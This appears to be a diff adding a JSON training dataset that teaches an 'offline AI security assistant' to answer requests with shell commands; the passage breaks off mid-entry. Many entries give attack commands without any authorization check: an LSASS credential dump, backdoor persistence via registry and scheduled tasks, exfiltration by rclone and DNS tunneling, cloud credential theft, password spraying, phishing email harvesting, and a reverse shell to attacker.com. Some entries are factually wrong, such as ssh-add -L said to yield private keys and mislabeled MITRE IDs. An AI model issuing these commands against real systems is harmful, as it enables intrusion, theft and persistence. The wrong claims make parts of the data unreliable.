@@ -1,0 +1,972 @@
+[
+  {
+    "instruction": "Who are you?",
+    "input": "",
+    "output": "I am Nikita, an Offline AI Security Assistant. I should not execute a system command for this identity question.",
+    "category": "Agent_Identity",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "Self_Awareness",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "What is your name?",
+    "input": "",
+    "output": "My name is Nikita, an Offline AI Security Assistant. This is an identity question that should be answered directly without executing system commands.",
+    "category": "Agent_Identity",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "Self_Awareness",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "How are you?",
+    "input": "",
+    "output": "I'm functioning properly and ready to assist with your security tasks. This is a status question that doesn't require command execution.",
+    "category": "Agent_Status",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "Self_Awareness",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "Are you operational?",
+    "input": "",
+    "output": "Yes, I'm operational and ready to assist with your security tasks. This is a status inquiry that should be answered directly without running commands.",
+    "category": "Agent_Status",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "Self_Awareness",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "Find my network interfaces",
+    "input": "",
+    "output": "Command: ip addr\nAnalysis: This command lists all network interfaces with their IP addresses. I should extract interface names (like eth0, wlan0), their states (UP/DOWN), and assigned IP addresses to provide a clear, readable summary.",
+    "category": "System_Info",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "ip"
+  },
+  {
+    "instruction": "Show my IP address",
+    "input": "",
+    "output": "Command: ip -4 addr show\nAnalysis: This shows IPv4 addresses for all interfaces. I should extract and format just the IP addresses with their associated interface names for a clean response, not just report 'Command executed successfully'.",
+    "category": "System_Info",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "ip"
+  },
+  {
+    "instruction": "What's my public IP address?",
+    "input": "",
+    "output": "Command: curl -s ifconfig.me || wget -qO- ifconfig.me\nAnalysis: This fetches the current public IP address from an external service. The output is simply the IP address with no formatting. I should present it clearly as 'Your public IP address is: x.x.x.x'.",
+    "category": "System_Info",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "curl"
+  },
+  {
+    "instruction": "Check if 192.168.1.1 is online",
+    "input": "Target: 192.168.1.1",
+    "output": "Command: ping -c 4 192.168.1.1\nAnalysis: Sends 4 ICMP echo requests to check if host responds. I should analyze packet statistics (4/4 received = 100% up, 0/4 = down, partial = intermittent) and response times to determine status.",
+    "category": "Network",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1595 - Active Scanning",
+    "scenario_type": "RealWorld",
+    "tool_used": "ping"
+  },
+  {
+    "instruction": "How to exploit open RDP ports on Windows",
+    "input": "Target has RDP (port 3389) open",
+    "output": "This is an educational query requiring an explanation, not a command execution. I should provide info about RDP security, potential attacks (brute force with hydra, exploitation with Metasploit), and related tools, with a reminder about ethical use.",
+    "category": "Security_How_To",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1110 - Brute Force",
+    "scenario_type": "Educational",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "How to crack a password hash",
+    "input": "Hash: $6$salt$hash",
+    "output": "This requires educational information rather than direct command execution. I should explain hash cracking methodology, tools like hashcat and John the Ripper, usage examples (hashcat -m 1800 -a 0 hash.txt wordlist.txt), and performance considerations.",
+    "category": "Security_How_To",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1110.002 - Password Cracking",
+    "scenario_type": "Educational",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "Scan my wifi networks",
+    "input": "",
+    "output": "Command: nmcli dev wifi list\nAnalysis: Lists available WiFi networks with signal strength and security. I should format the output to show SSID names, signal strength (as a percentage or bars), and security type (WPA, WEP, Open) in a readable list.",
+    "category": "Wifi_Operations",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "nmcli"
+  },
+  {
+    "instruction": "Run a port scan on 192.168.1.100",
+    "input": "Target: 192.168.1.100",
+    "output": "Command: nmap -sV -sC 192.168.1.100\nAnalysis: Performs service detection (-sV) and runs default scripts (-sC) on target IP. I should interpret the results by listing open ports, services running, versions detected, and potential vulnerabilities.",
+    "category": "Recon",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1046 - Network Service Scanning",
+    "scenario_type": "RealWorld",
+    "tool_used": "nmap"
+  },
+  {
+    "instruction": "Check disk usage",
+    "input": "",
+    "output": "Command: df -h\nAnalysis: Shows disk space usage in human-readable format. I should analyze the output to highlight total space, used space, available space, and percentage used for each filesystem. Focus on partitions above 80% usage.",
+    "category": "System_Info",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "df"
+  },
+  {
+    "instruction": "Check memory usage",
+    "input": "",
+    "output": "Command: free -h\nAnalysis: Displays memory usage in human-readable format. I should extract and clearly present total RAM, used RAM, free RAM, and swap usage with their values, highlighting if memory usage is high (>80%).",
+    "category": "System_Info",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "free"
+  },
+  {
+    "instruction": "List running processes",
+    "input": "",
+    "output": "Command: ps aux\nAnalysis: Shows all running processes with detailed information. The output is typically large, so I should summarize by showing the top 5-10 processes by CPU or memory usage and total count of processes running.",
+    "category": "Process_Management",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "ps"
+  },
+  {
+    "instruction": "Find available tools for web scanning",
+    "input": "",
+    "output": "This requires informational output rather than command execution. I should list common web scanning tools (nikto, dirb, gobuster, wpscan, sqlmap, ZAP) with brief descriptions of each tool's purpose and basic usage examples.",
+    "category": "Security_How_To",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "Educational",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "Perform directory brute forcing on a website",
+    "input": "Target: http://192.168.1.10",
+    "output": "Command: gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nAnalysis: Performs directory discovery using a wordlist. I should interpret results by listing discovered directories/files, their status codes, and highlighting interesting findings (admin panels, config files, etc).",
+    "category": "Web",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1595.003 - Active Scanning: Fingerprinting",
+    "scenario_type": "RealWorld",
+    "tool_used": "gobuster"
+  },
+  {
+    "instruction": "Find interesting files on the system",
+    "input": "",
+    "output": "Command: find / -type f -size +1M -size -10M -not -path \"/proc/*\" -not -path \"/sys/*\" 2>/dev/null\nAnalysis: Searches for files between 1MB and 10MB, excluding system directories. The results need to be properly formatted as a list of potentially interesting files with their sizes and locations.",
+    "category": "File_Operations",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1083 - File and Directory Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "find"
+  },
+  {
+    "instruction": "Check services running on the system",
+    "input": "",
+    "output": "Command: systemctl list-units --type=service --state=running\nAnalysis: Lists all running services managed by systemd. I should format the output to show service names, descriptions, and status in a clear table or list format for better readability.",
+    "category": "System_Info",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1007 - System Service Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "systemctl"
+  },
+  {
+    "instruction": "Show network connections",
+    "input": "",
+    "output": "Command: netstat -tuln\nAnalysis: Shows active TCP/UDP listening ports. I should analyze the output to identify which ports are open, the services likely running on them, and any potential security concerns from exposed services.",
+    "category": "Network",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1049 - System Network Connections Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "netstat"
+  },
+  {
+    "instruction": "What do you know about penetration testing?",
+    "input": "",
+    "output": "This is a knowledge question, not a command execution request. I should provide educational information about penetration testing methodology, phases (reconnaissance, scanning, exploitation, post-exploitation, reporting), tools, and ethical considerations.",
+    "category": "Security_Knowledge",
+    "difficulty": "medium",
+    "attack_technique": "N/A",
+    "scenario_type": "Educational",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "Run a nmap command with no output",
+    "input": "Target: 127.0.0.1",
+    "output": "Command: nmap -p 1-100 127.0.0.1\nAnalysis: The command executed with no significant findings. I should report that no open ports were found in the specified range, rather than just saying 'Command executed successfully' without context.",
+    "category": "Error_Handling",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1046 - Network Service Scanning",
+    "scenario_type": "Edge_Case",
+    "tool_used": "nmap"
+  },
+  {
+    "instruction": "Execute a command that will fail",
+    "input": "nonexistentcommand",
+    "output": "Command: nonexistentcommand\nAnalysis: The command failed with 'command not found' error. I should acknowledge the failure, explain the issue (command doesn't exist on the system), and suggest alternatives or installation methods if appropriate.",
+    "category": "Error_Handling",
+    "difficulty": "easy",
+    "attack_technique": "N/A",
+    "scenario_type": "Edge_Case",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "Analyze a suspicious file",
+    "input": "File: suspicious.exe",
+    "output": "Command: file suspicious.exe && strings suspicious.exe | grep -E 'http|password|user' && md5sum suspicious.exe\nAnalysis: Performs basic static analysis: file type identification, extraction of interesting strings, and hash calculation. I should interpret all outputs together for a comprehensive analysis.",
+    "category": "Forensics",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1204 - User Execution",
+    "scenario_type": "RealWorld",
+    "tool_used": "multiple"
+  },
+  {
+    "instruction": "Why am I getting a 404 error?",
+    "input": "",
+    "output": "This is a troubleshooting question that requires analysis, not direct command execution. I should explain that 404 means 'Not Found', discuss common causes (URL typo, removed resource, misconfigured webserver), and suggest diagnostic steps (check URL, server logs, etc).",
+    "category": "Troubleshooting",
+    "difficulty": "medium",
+    "attack_technique": "N/A",
+    "scenario_type": "Educational",
+    "tool_used": "none"
+  },
+  {
+    "instruction": "Can you encrypt a file for me?",
+    "input": "File: sensitive.txt",
+    "output": "Command: gpg -c sensitive.txt\nAnalysis: Encrypts the file with a symmetric key (password). I should explain that this will create sensitive.txt.gpg file, prompt for a password during execution, and provide instructions for later decryption.",
+    "category": "Security_Operations",
+    "difficulty": "medium",
+    "attack_technique": "N/A",
+    "scenario_type": "RealWorld",
+    "tool_used": "gpg"
+  },
+  {
+    "instruction": "Scan a network for live hosts",
+    "input": "Target: 192.168.1.0/24",
+    "output": "Command: nmap -sn 192.168.1.0/24\nAnalysis: Performs a ping sweep to identify active hosts.",
+    "category": "Recon",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1046 - Network Service Scanning",
+    "scenario_type": "RealWorld",
+    "tool_used": "nmap"
+  },
+  {
+    "instruction": "Perform banner grabbing on a web server",
+    "input": "Target: http://192.168.1.100",
+    "output": "Command: curl -I http://192.168.1.100\nAnalysis: Fetches HTTP headers to identify server details.",
+    "category": "Recon",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1592 - Gather Victim Host Information",
+    "scenario_type": "RealWorld",
+    "tool_used": "curl"
+  },
+  {
+    "instruction": "Check for subdomains of a target domain",
+    "input": "Target: example.com",
+    "output": "Command: subfinder -d example.com\nAnalysis: Finds subdomains using public and private sources.",
+    "category": "OSINT",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1590.002 - Gather Victim Network Information",
+    "scenario_type": "RealWorld",
+    "tool_used": "subfinder"
+  },
+  {
+    "instruction": "Check for open SMB shares on a network",
+    "input": "Target: 192.168.1.0/24",
+    "output": "Command: smbclient -L //192.168.1.X -N\nAnalysis: Lists SMB shares on a remote machine.",
+    "category": "Network",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1135 - Network Share Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "smbclient"
+  },
+  {
+    "instruction": "Detect SQL Injection vulnerabilities on a website",
+    "input": "Target: http://example.com/products?id=1",
+    "output": "Command: sqlmap -u 'http://example.com/products?id=1' --batch --dbs\nAnalysis: Attempts automated SQL injection testing to extract database names.",
+    "category": "Web",
+    "difficulty": "hard",
+    "attack_technique": "OWASP A03:2021 - Injection",
+    "scenario_type": "CTF",
+    "tool_used": "sqlmap"
+  },
+  {
+    "instruction": "Capture NTLMv2 challenge-response hashes on a local network",
+    "input": "Target: Local network traffic",
+    "output": "Command: responder -I eth0\nAnalysis: Listens for and captures NTLMv2 hashes from network authentication attempts.",
+    "category": "Post-Exploitation",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1187 - Forced Authentication",
+    "scenario_type": "RealWorld",
+    "tool_used": "responder"
+  },
+  {
+    "instruction": "Find public S3 buckets for a target organization",
+    "input": "Target: examplecorp",
+    "output": "Command: aws s3 ls s3://examplecorp-public --no-sign-request\nAnalysis: Checks for publically accessible AWS S3 buckets.",
+    "category": "Cloud",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1526 - Cloud Service Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "aws-cli"
+  },
+  {
+    "instruction": "Enumerate WordPress users on a website",
+    "input": "Target: http://example.com",
+    "output": "Command: wpscan --url http://example.com --enumerate u\nAnalysis: Lists WordPress usernames, which can be used for further attacks.",
+    "category": "Web",
+    "difficulty": "medium",
+    "attack_technique": "OWASP A07:2021 - Identification & Authentication Failures",
+    "scenario_type": "CTF",
+    "tool_used": "wpscan"
+  },
+  {
+    "instruction": "Check if a file contains embedded malicious scripts",
+    "input": "File: suspicious.js",
+    "output": "Command: cat suspicious.js | grep -i '<script>'\nAnalysis: Searches for inline scripts that could indicate JavaScript malware.",
+    "category": "Malware Analysis",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1059.007 - JavaScript",
+    "scenario_type": "RealWorld",
+    "tool_used": "grep"
+  },
+  {
+    "instruction": "Identify weak SSH passwords via brute-force",
+    "input": "Target: ssh://192.168.1.10",
+    "output": "Command: hydra -L users.txt -P passwords.txt ssh://192.168.1.10\nAnalysis: Attempts brute-force login against SSH with common credentials.",
+    "category": "Passwords",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1110.001 - Password Guessing",
+    "scenario_type": "CTF",
+    "tool_used": "hydra"
+  },
+  {
+    "instruction": "Find hidden directories on a web server",
+    "input": "Target: http://example.com",
+    "output": "Command: gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nAnalysis: Scans for common hidden directories on the web server.",
+    "category": "Web",
+    "difficulty": "medium",
+    "attack_technique": "OWASP A06:2021 - Vulnerable and Outdated Components",
+    "scenario_type": "CTF",
+    "tool_used": "gobuster"
+  },
+  {
+    "instruction": "Retrieve metadata from a leaked document",
+    "input": "File: leaked.docx",
+    "output": "Command: exiftool leaked.docx\nAnalysis: Extracts metadata, including author names, timestamps, and software details.",
+    "category": "OSINT",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1596 - Search Open Websites/Domains",
+    "scenario_type": "RealWorld",
+    "tool_used": "exiftool"
+  },
+  {
+    "instruction": "Check if a website has Clickjacking protection",
+    "input": "Target: http://example.com",
+    "output": "Command: curl -I http://example.com | grep -i 'X-Frame-Options'\nAnalysis: If the header is missing, the website may be vulnerable to Clickjacking.",
+    "category": "Web",
+    "difficulty": "easy",
+    "attack_technique": "OWASP A05:2021 - Security Misconfiguration",
+    "scenario_type": "RealWorld",
+    "tool_used": "curl"
+  },
+  {
+    "instruction": "Dump credentials from LSASS on a Windows machine",
+    "input": "Target: Compromised Windows system",
+    "output": "Command: mimikatz 'privilege::debug' 'sekurlsa::logonpasswords' exit\nAnalysis: Extracts stored credentials from memory using LSASS.",
+    "category": "Post-Exploitation",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1003 - Credential Dumping",
+    "scenario_type": "RealWorld",
+    "tool_used": "mimikatz"
+  },
+  {
+    "instruction": "Enumerate open RDP servers on a subnet",
+    "input": "Target: 192.168.1.0/24",
+    "output": "Command: nmap -p 3389 --open 192.168.1.0/24\nAnalysis: Identifies active Remote Desktop Protocol (RDP) servers on the network.",
+    "category": "Recon",
+    "difficulty": "easy",
+    "attack_technique": "MITRE T1046 - Network Service Scanning",
+    "scenario_type": "RealWorld",
+    "tool_used": "nmap"
+  },
+  {
+    "instruction": "Extract API keys from JavaScript files",
+    "input": "Target: http://example.com",
+    "output": "Command: curl http://example.com/app.js | grep -E 'API_KEY|secret|token'\nAnalysis: Searches for exposed API keys within JavaScript files.",
+    "category": "Web",
+    "difficulty": "medium",
+    "attack_technique": "OWASP A02:2021 - Cryptographic Failures",
+    "scenario_type": "RealWorld",
+    "tool_used": "curl"
+  },
+  {
+    "instruction": "Capture and analyze network traffic",
+    "input": "Target: Network interface eth0",
+    "output": "Command: tcpdump -i eth0 -nn -w capture.pcap\nAnalysis: Captures raw network packets for later analysis.",
+    "category": "Network",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1040 - Network Sniffing",
+    "scenario_type": "RealWorld",
+    "tool_used": "tcpdump"
+  },
+  {
+    "instruction": "Find publicly exposed Jenkins servers",
+    "input": "Target: Public internet",
+    "output": "Command: shodan search 'Jenkins 200 OK'\nAnalysis: Searches Shodan for publicly accessible Jenkins instances.",
+    "category": "OSINT",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1596.002 - Search Open Websites/Domains",
+    "scenario_type": "RealWorld",
+    "tool_used": "shodan"
+  },
+  {
+    "instruction": "Test for unrestricted file uploads on a website",
+    "input": "Target: http://example.com/upload",
+    "output": "Command: Upload a PHP shell disguised as an image: shell.php.jpg\nAnalysis: If the upload succeeds and can be executed, the server is vulnerable.",
+    "category": "Web",
+    "difficulty": "hard",
+    "attack_technique": "OWASP A08:2021 - Software and Data Integrity Failures",
+    "scenario_type": "CTF",
+    "tool_used": "manual"
+  },
+  {
+    "instruction": "Brute-force Office365 email logins",
+    "input": "Target: victim@example.com",
+    "output": "Command: o365spray -e victim@example.com -w passwords.txt\nAnalysis: Tries multiple passwords against an Office365 account.",
+    "category": "Passwords",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1110.003 - Password Spraying",
+    "scenario_type": "RealWorld",
+    "tool_used": "o365spray"
+  },
+  {
+    "instruction": "Find misconfigured S3 buckets on a target domain",
+    "input": "Target: example.com",
+    "output": "Command: aws s3 ls s3://example.com --no-sign-request\nAnalysis: Checks for open, misconfigured S3 buckets that allow public listing.",
+    "category": "Cloud",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1526 - Cloud Service Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "aws-cli"
+  },
+  {
+    "instruction": "Search for leaked credentials in Pastebin dumps",
+    "input": "Target: example.com",
+    "output": "Command: theharvester -d example.com -b pastebin\nAnalysis: Scans Pastebin dumps for leaked credentials related to the target domain.",
+    "category": "OSINT",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1596 - Search Open Websites/Domains",
+    "scenario_type": "RealWorld",
+    "tool_used": "theHarvester"
+  },
+  {
+    "instruction": "Find company employee emails for phishing attacks",
+    "input": "Target: examplecorp.com",
+    "output": "Command: hunter.io search for *@examplecorp.com\nAnalysis: Gathers employee emails for phishing or social engineering attacks.",
+    "category": "OSINT",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1589.002 - Email Addresses",
+    "scenario_type": "RealWorld",
+    "tool_used": "hunter.io"
+  },
+  {
+    "instruction": "Bypass Windows User Account Control (UAC) for privilege escalation",
+    "input": "Target: Compromised Windows machine",
+    "output": "Command: Invoke-UACBypass\nAnalysis: Uses a UAC bypass technique to escalate privileges without user confirmation.",
+    "category": "Privilege Escalation",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1548.002 - Bypass User Account Control",
+    "scenario_type": "RealWorld",
+    "tool_used": "PowerShell"
+  },
+  {
+    "instruction": "Scan an internal network for unpatched SMB vulnerabilities",
+    "input": "Target: 192.168.1.0/24",
+    "output": "Command: nmap --script smb-vuln* -p 445 192.168.1.0/24\nAnalysis: Checks for known SMB vulnerabilities like EternalBlue.",
+    "category": "Network",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1210 - Exploitation of Remote Services",
+    "scenario_type": "RealWorld",
+    "tool_used": "nmap"
+  },
+  {
+    "instruction": "Hijack AWS metadata service to steal temporary credentials",
+    "input": "Target: AWS instance",
+    "output": "Command: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nAnalysis: Extracts AWS credentials from the instance metadata API.",
+    "category": "Cloud",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1552.005 - Cloud Instance Metadata API",
+    "scenario_type": "RealWorld",
+    "tool_used": "curl"
+  },
+  {
+    "instruction": "Find Tor hidden services related to a target company",
+    "input": "Target: examplecorp",
+    "output": "Command: ahmia.fi search 'examplecorp'\nAnalysis: Searches the Tor network for hidden services mentioning the target company.",
+    "category": "OSINT",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1594 - Search Victim-Owned Websites",
+    "scenario_type": "RealWorld",
+    "tool_used": "Ahmia"
+  },
+  {
+    "instruction": "Gain persistence on a Windows machine using a scheduled task",
+    "input": "Target: Compromised Windows machine",
+    "output": "Command: schtasks /create /sc onlogon /tn 'Updater' /tr 'C:\\backdoor.exe' /ru SYSTEM\nAnalysis: Creates a scheduled task that runs a backdoor on user login.",
+    "category": "Post-Exploitation",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1053.005 - Scheduled Task/Job",
+    "scenario_type": "RealWorld",
+    "tool_used": "schtasks"
+  },
+  {
+    "instruction": "Exfiltrate data via DNS tunneling",
+    "input": "Target: Exfiltrating sensitive data",
+    "output": "Command: iodine -f -P secretpassword example.com\nAnalysis: Uses DNS tunneling to bypass network restrictions and exfiltrate data.",
+    "category": "Red Team",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1071.004 - Application Layer Protocol: DNS",
+    "scenario_type": "RealWorld",
+    "tool_used": "iodine"
+  },
+  {
+    "instruction": "Enumerate a target's GitHub repositories for secrets",
+    "input": "Target: examplecorp",
+    "output": "Command: github-secrets --org examplecorp\nAnalysis: Scans public repositories for API keys, credentials, and secrets.",
+    "category": "OSINT",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1552.001 - Credentials in Files",
+    "scenario_type": "RealWorld",
+    "tool_used": "github-secrets"
+  },
+  {
+    "instruction": "Enumerate users in an Active Directory environment",
+    "input": "Target: AD domain example.local",
+    "output": "Command: bloodhound-python -u user -p password -d example.local -c all\nAnalysis: Collects AD data for attack path analysis using BloodHound.",
+    "category": "Active Directory",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1069.002 - Permission Groups Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "BloodHound"
+  },
+  {
+    "instruction": "Abuse GPO misconfigurations to execute commands in Active Directory",
+    "input": "Target: AD domain example.local",
+    "output": "Command: Invoke-GPOAbuse -TargetDomain example.local -Command 'cmd.exe /c calc.exe'\nAnalysis: Executes a command across all domain-joined machines via Group Policy Object.",
+    "category": "Active Directory",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1484.001 - Domain Policy Modification",
+    "scenario_type": "RealWorld",
+    "tool_used": "PowerView"
+  },
+  {
+    "instruction": "Escalate privileges on Linux using SUID binaries",
+    "input": "Target: Linux machine",
+    "output": "Command: find / -perm -4000 -type f 2>/dev/null\nAnalysis: Identifies files with the SUID bit set that may allow privilege escalation.",
+    "category": "Privilege Escalation",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1548.001 - SetUID and SetGID",
+    "scenario_type": "RealWorld",
+    "tool_used": "Linux find"
+  },
+  {
+    "instruction": "Exploit Kubernetes API for unauthorized access",
+    "input": "Target: Kubernetes cluster",
+    "output": "Command: kubectl get pods --server https://example.com --token abc123\nAnalysis: Attempts to enumerate Kubernetes pods using exposed API endpoints.",
+    "category": "Cloud",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1525 - Implant Internal Image",
+    "scenario_type": "RealWorld",
+    "tool_used": "kubectl"
+  },
+  {
+    "instruction": "Find shadow IT assets using subdomain enumeration",
+    "input": "Target: example.com",
+    "output": "Command: assetfinder --subs-only example.com\nAnalysis: Finds forgotten or hidden subdomains that may lead to security risks.",
+    "category": "OSINT",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1590.002 - Gather Victim Network Information",
+    "scenario_type": "RealWorld",
+    "tool_used": "assetfinder"
+  },
+  {
+    "instruction": "Steal AWS credentials from compromised EC2 instance",
+    "input": "Target: AWS instance",
+    "output": "Command: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nAnalysis: Retrieves temporary AWS credentials via the instance metadata service.",
+    "category": "Cloud",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1552.005 - Cloud Instance Metadata API",
+    "scenario_type": "RealWorld",
+    "tool_used": "curl"
+  },
+  {
+    "instruction": "Capture keystrokes on Linux without root",
+    "input": "Target: Compromised Linux machine",
+    "output": "Command: showkey -a\nAnalysis: Captures keypresses in real-time, useful for collecting sensitive input.",
+    "category": "Post-Exploitation",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1056.001 - Keylogging",
+    "scenario_type": "RealWorld",
+    "tool_used": "showkey"
+  },
+  {
+    "instruction": "Maintain persistence using Windows Registry Run keys",
+    "input": "Target: Compromised Windows machine",
+    "output": "Command: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d 'C:\\backdoor.exe'\nAnalysis: Ensures malware runs every time the user logs in.",
+    "category": "Persistence",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1547.001 - Registry Run Keys / Startup Folder",
+    "scenario_type": "RealWorld",
+    "tool_used": "reg"
+  },
+  {
+    "instruction": "Exfiltrate data via OneDrive without detection",
+    "input": "Target: OneDrive account",
+    "output": "Command: rclone copy /sensitive_data onedrive:/stealth_folder\nAnalysis: Uses rclone to stealthily exfiltrate data to an attacker-controlled OneDrive.",
+    "category": "Exfiltration",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1567.002 - Exfiltration to Cloud Storage",
+    "scenario_type": "RealWorld",
+    "tool_used": "rclone"
+  },
+  {
+    "instruction": "Enumerate installed applications on Windows for privilege escalation",
+    "input": "Target: Windows machine",
+    "output": "Command: wmic product get name,version\nAnalysis: Lists installed applications, which may have privilege escalation vulnerabilities.",
+    "category": "Privilege Escalation",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1087.001 - Software Discovery",
+    "scenario_type": "RealWorld",
+    "tool_used": "WMIC"
+  },
+  {
+    "instruction": "Enumerate Azure Active Directory users via misconfigured API permissions",
+    "input": "Target: Azure tenant example.onmicrosoft.com",
+    "output": "Command: az ad user list --output table\nAnalysis: Retrieves Azure AD users if API permissions allow unauthorized access.",
+    "category": "Cloud",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1087.002 - Cloud Account Enumeration",
+    "scenario_type": "RealWorld",
+    "tool_used": "Azure CLI"
+  },
+  {
+    "instruction": "Exploit Jenkins CLI to run commands on a build server",
+    "input": "Target: Compromised Jenkins instance",
+    "output": "Command: java -jar jenkins-cli.jar -s http://jenkins.example.com/ groovysh\nAnalysis: Opens a Groovy shell on the Jenkins server, enabling arbitrary code execution.",
+    "category": "CI/CD",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1072 - Software Deployment Tools",
+    "scenario_type": "RealWorld",
+    "tool_used": "Jenkins CLI"
+  },
+  {
+    "instruction": "Steal AWS IAM credentials from environment variables",
+    "input": "Target: Compromised AWS Lambda or EC2 instance",
+    "output": "Command: env | grep -i aws\nAnalysis: Extracts AWS credentials stored in environment variables.",
+    "category": "Cloud",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1552.005 - Cloud Instance Metadata API",
+    "scenario_type": "RealWorld",
+    "tool_used": "Linux grep"
+  },
+  {
+    "instruction": "Persist on an Active Directory domain by modifying AdminSDHolder",
+    "input": "Target: AD domain example.local",
+    "output": "Command: Set-ADObject -Identity 'CN=AdminSDHolder,CN=System,DC=example,DC=local' -Add @{ntSecurityDescriptor='S-1-5-21-XXXXXX-XXXXXX-XXXXXX-500'}\nAnalysis: Modifies AdminSDHolder to retain admin access even if group memberships change.",
+    "category": "Active Directory",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1098.003 - Group Policy Modification",
+    "scenario_type": "RealWorld",
+    "tool_used": "PowerShell"
+  },
+  {
+    "instruction": "Escalate privileges on Linux using dirty pipe exploit",
+    "input": "Target: Linux kernel 5.8+",
+    "output": "Command: ./dirtypipe-exploit /bin/bash\nAnalysis: Exploits a kernel vulnerability (CVE-2022-0847) to gain root privileges.",
+    "category": "Privilege Escalation",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1068 - Exploitation for Privilege Escalation",
+    "scenario_type": "RealWorld",
+    "tool_used": "dirtypipe-exploit"
+  },
+  {
+    "instruction": "Hijack SSH agent to steal keys for lateral movement",
+    "input": "Target: Compromised Linux machine",
+    "output": "Command: ssh-add -L\nAnalysis: Retrieves private SSH keys stored in the SSH agent for further compromise.",
+    "category": "Lateral Movement",
+    "difficulty": "medium",
+    "attack_technique": "MITRE T1552.004 - Credential Dumping: SSH Keys",
+    "scenario_type": "RealWorld",
+    "tool_used": "ssh-add"
+  },
+  {
+    "instruction": "Deploy a reverse shell via Kubernetes misconfigured API",
+    "input": "Target: Kubernetes cluster",
+    "output": "Command: kubectl run shell --image=alpine -- /bin/sh -c 'nc -e /bin/sh attacker.com 4444'\nAnalysis: Executes a reverse shell if the Kubernetes API is misconfigured.",
+    "category": "Cloud",
+    "difficulty": "hard",
+    "attack_technique": "MITRE T1525 - Implant Internal Image",
+    "scenario_type": "RealWorld",
+    "tool_used": "kubectl"
+  },
+  {
+    "instruction": "Discover misconfigured Google Cloud Storage buckets",
+    "input": "Target: example.com",
